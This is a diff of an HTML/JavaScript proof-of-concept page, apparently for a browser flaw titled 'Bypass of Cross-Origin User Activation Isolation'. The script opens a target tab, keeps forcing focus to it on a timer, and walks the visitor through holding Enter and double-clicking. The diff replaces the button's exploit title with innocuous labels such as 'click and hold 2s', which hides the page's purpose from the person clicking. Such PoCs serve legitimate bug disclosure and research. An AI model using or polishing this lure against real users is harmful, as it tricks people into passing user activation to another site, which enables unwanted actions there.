@@ -1,12 +1,15 @@
 <!DOCTYPE html>
 <html>
+
 <body style="background: #fff5f5; font-family: sans-serif; text-align: center; padding: 50px;">
 
-    <button id="main-exploit-btn" style="padding: 20px 40px; font-size: 24px; cursor: pointer; background: #ff4444; color: white; border: none; border-radius: 12px; font-weight: bold; transition: all 0.3s ease;">
-        Bypass of Cross-Origin User Activation Isolation
+    <button id="main-exploit-btn"
+        style="margin-top: 30px; padding: 5px 5px; font-size: 24px; cursor: pointer; background: #ff4444; color: white; border: none; border-radius: 12px; font-weight: bold; transition: all 0.3s ease;">
+        click and hold 2s
     </button>
 
-    <div id="instruction-box" style="margin-top: 45px; border: 2px dashed #ff4444; padding: 5px; background: white; max-width: 250px; margin-left: auto; margin-right: auto;">
+    <div id="instruction-box"
+        style="margin-top: 30px; border: 2px dashed #ff4444; padding: 20px; background: white; max-width: 500px; margin-left: auto; margin-right: auto;">
         <p id="step-text"><b>Step 1:</b> Click and <b>HOLD "Enter"</b> on the red button above.</p>
     </div>
 
@@ -24,7 +27,7 @@
             console.log("[*] Stage 1: Opening target tab...");
             victim = window.open(targetURL, "_blank");
 
-            mainBtn.innerText = "Click 2x and Enter";
+            mainBtn.innerText = "button";
             mainBtn.style.background = "#444";
             stepText.innerHTML = "<b>Step 2:</b> Now, <b>Double Click</b> the button while still holding/pressing Enter.";
 
@@ -35,7 +38,7 @@
                     return;
                 }
                 try {
-                    victim.focus(); 
+                    victim.focus();
                 } catch (e) { }
             }, 100);
         });
@@ -55,4 +58,5 @@
         }
     </script>
 </body>
+
 </html>
